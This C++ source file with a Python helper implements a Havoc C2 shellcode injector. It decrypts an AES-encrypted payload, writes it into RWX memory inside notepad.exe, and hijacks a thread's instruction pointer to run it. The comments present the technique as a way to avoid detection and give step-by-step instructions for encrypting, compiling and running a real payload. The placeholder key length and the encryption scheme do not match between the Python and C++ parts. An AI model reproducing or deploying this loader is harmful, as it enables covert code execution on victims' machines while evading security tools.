/*
This technique is more advanced than your previous loader. Instead of creating a new thread (which is highly suspicious), it:
    Decrypts an AES-encrypted payload in memory.
    Finds a target process (notepad.exe).
    Allocates RWX memory inside the target process.
    Writes the decrypted shellcode into that memory.
    Hijacks an existing thread in the target, changing its RIP (Instruction Pointer) to point to the shellcode.
    Resumes the thread, causing the target to execute the Havoc payload.
*/

/*
How to prepare your Havoc payload for this code
The screenshots show a payload encrypted with AES-256. You cannot paste the raw havoc.bin into this code—it will crash or be caught immediately. You need to encrypt it first.
Here is a Python script you can run on your Kali machine to generate the AES-encrypted byte arrays for the C++ code:

sourceCode
"
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os

# 1. Read the raw havoc shellcode
with open("havoc.bin", "rb") as f:
    raw_payload = f.read()

# 2. Generate a random 32-byte key for AES-256
key = os.urandom(32)

# 3. Encrypt the payload (Havoc shellcodes are usually not aligned, so we must pad them)
cipher = AES.new(key, AES.MODE_ECB) # The C++ code uses default CryptoAPI padding
padded_payload = pad(raw_payload, AES.block_size)
encrypted_payload = cipher.encrypt(padded_payload)

# 4. Format as C++ arrays
def format_c_array(data):
    hex_array = [f"0x{b:02x}" for b in data]
    # Break into lines of 16 bytes for readability
    lines = []
    for i in range(0, len(hex_array), 16):
        lines.append(", ".join(hex_array[i:i+16]))
    return ",\n    ".join(lines)

print("unsigned char payload[] = { \n    " + format_c_array(encrypted_payload) + "\n};")
print(f"unsigned int payload_len = sizeof(payload);")
print("\nunsigned char key[] = { \n    " + format_c_array(key) + "\n};")
"

Run this script on your havoc.bin.
Copy the output.
Replace the payload[] and key[] arrays in the C++ code.
Compile and run. (Ensure notepad.exe is open so the injector has a target).
*/


#include <windows.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")

// =====================================================================
// IMPORTANT: 
// Paste your AES-encrypted Havoc payload bytes inside the payload[] array.
// Paste your 32-byte AES key inside the key[] array.
// =====================================================================

// Example placeholder for the encrypted payload (from Havoc C2)
unsigned char payload[] = { 
    0x9f, 0xa3, 0x9b, 0x90, 0xda, 0xc3, 0x71, 0x31, 0xbf, 0x8f, 0x36, 0x40, 0x08, 0xc0, 0x6a, 0x43, 
    0x4e, 0x82, 0x4c, 0x03, 0xdb, 0x54, 0x6e, 0x09, 0x86, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 
}; // Replace with your full payload
unsigned char key[] = { 
    0xf4, 0xee, 0xd2, 0xe7, 0x31, 0xf1, 0x4f, 0x75, 0x20, 0x1b, 0x97, 0x67, 0x7c, 0xeb, 0xa6, 0x97 
}; // Replace with your full 32-byte AES key

unsigned int payload_len = sizeof(payload);

// =====================================================================
// Helper: Print short hex preview
// =====================================================================
void PrintHexPreview(const char* label, const unsigned char* data, size_t len) {
    printf("%s: ", label);
    for (size_t i = 0; i < len && i < 16; i++) {
        printf("%02x ", data[i]);
    }
    printf("...\n");
}

// =====================================================================
// AES-256 decryption (CryptoAPI)
// =====================================================================
int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return -1;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) return -1;
    if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) return -1;
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) return -1;
    
    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&payload_len)) return -1;
    
    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}

// =====================================================================
// Find target process PID
// =====================================================================
DWORD FindTarget(const char* procname) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe;
    DWORD pid = 0;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    pe.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, procname) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return pid;
}

// =====================================================================
// Find any thread in target process
// =====================================================================
HANDLE FindThread(DWORD pid) {
    HANDLE hSnapshot;
    THREADENTRY32 te;
    HANDLE hThread = NULL;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return NULL;

    te.dwSize = sizeof(THREADENTRY32);
    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                if (hThread) break;
            }
        } while (Thread32Next(hSnapshot, &te));
    }
    CloseHandle(hSnapshot);
    return hThread;
}

// =====================================================================
// Core injection logic: Thread Context Hijacking
// =====================================================================
int InjectCTX(DWORD pid, HANDLE hProc, unsigned char* payload, unsigned int payload_len) {
    HANDLE hThread = NULL;
    LPVOID pRemoteCode = NULL;
    CONTEXT ctx = { 0 };

    // 1. Find thread to hijack
    hThread = FindThread(pid);
    if (!hThread) return -1;

    // 2. Decrypt payload (in local process memory)
    printf("[DECRYPT] Decrypting payload in local memory...\n");
    if (AESDecrypt((char*)payload, payload_len, (char*)key, sizeof(key)) != 0) {
        printf(" [!] Decryption failed!\n");
        CloseHandle(hThread);
        return -1;
    }
    printf("[DECRYPT] Payload decrypted successfully\n");
    PrintHexPreview("Decrypted payload preview", payload, payload_len > 64 ? 64 : payload_len);

    // 3. Allocate RWX memory in target process
    printf("\n[MEMORY] Allocating %u bytes (RWX) in target process... ", payload_len);
    pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteCode) {
        printf("FAILED (%lu)\n", GetLastError());
        CloseHandle(hThread);
        return -1;
    }
    printf("OK -> 0x%p\n", pRemoteCode);

    // 4. Write shellcode
    printf("[MEMORY] Writing shellcode to remote memory... ");
    if (!WriteProcessMemory(hProc, pRemoteCode, payload, payload_len, NULL)) {
        printf("FAILED (%lu)\n", GetLastError());
        CloseHandle(hThread);
        return -1;
    }
    printf("OK\n");

    // 5. Suspend target thread
    printf("[THREAD] Suspending thread... ");
    DWORD prevCount = SuspendThread(hThread);
    if (prevCount == (DWORD)-1) {
        printf("FAILED (%lu)\n", GetLastError());
        CloseHandle(hThread);
        return -1;
    }
    printf("OK (previous suspend count: %lu)\n", prevCount);

    // 6. Get & modify context
    printf("[CONTEXT] Getting thread context... ");
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &ctx)) {
        printf("FAILED (%lu)\n", GetLastError());
        ResumeThread(hThread);
        CloseHandle(hThread);
        return -1;
    }
    printf("OK\n");

    printf("[CONTEXT] Changing instruction pointer to shellcode... ");
#ifdef _M_X64
    DWORD64 oldRip = ctx.Rip;
    ctx.Rip = (DWORD64)pRemoteCode;
    printf("RIP 0x%016llX -> 0x%p\n", oldRip, pRemoteCode);
#else
    DWORD oldEip = ctx.Eip;
    ctx.Eip = (DWORD)pRemoteCode;
    printf("EIP 0x%08lX -> 0x%p\n", oldEip, pRemoteCode);
#endif

    if (!SetThreadContext(hThread, &ctx)) {
        printf("FAILED (%lu)\n", GetLastError());
        ResumeThread(hThread);
        CloseHandle(hThread);
        return -1;
    }
    printf("OK\n");

    // 7. Resume -> shellcode should execute
    printf("[THREAD] Resuming thread -> shellcode execution triggered!\n");
    ResumeThread(hThread);

    CloseHandle(hThread);
    return 0;
}

// =====================================================================
// Main Function
// =====================================================================
int main(void) {
    printf("=== Thread Context Hijacking Demo ===\n");
    printf("[Target: notepad.exe]\n");

    DWORD pid = FindTarget("notepad.exe");
    if (!pid) {
        printf("\n[!] Could not find notepad.exe\n");
        printf("Press Enter to exit...\n");
        getchar();
        return 1;
    }

    printf("\n[PROCESS] Opening target process (PID %lu)... ", pid);
    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
                               PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, 
                               FALSE, pid);
    if (!hProc) {
        printf("FAILED (%lu)\n", GetLastError());
        printf("Press Enter to exit...\n");
        getchar();
        return 1;
    }
    printf("OK\n");

    PrintHexPreview("Encrypted payload preview", payload, payload_len > 64 ? 64 : payload_len);
    PrintHexPreview("AES key", key, sizeof(key));

    printf("\n=== Starting Injection ===\n\n");
    
    if (InjectCTX(pid, hProc, payload, payload_len) == 0) {
        printf("\n[+] Injection completed - shellcode should be running!\n");
    } else {
        printf("\n[!] Injection failed somewhere\n");
    }

    CloseHandle(hProc);

    printf("\nDemo finished. Press Enter to exit...\n");
    getchar();
    return 0;
}
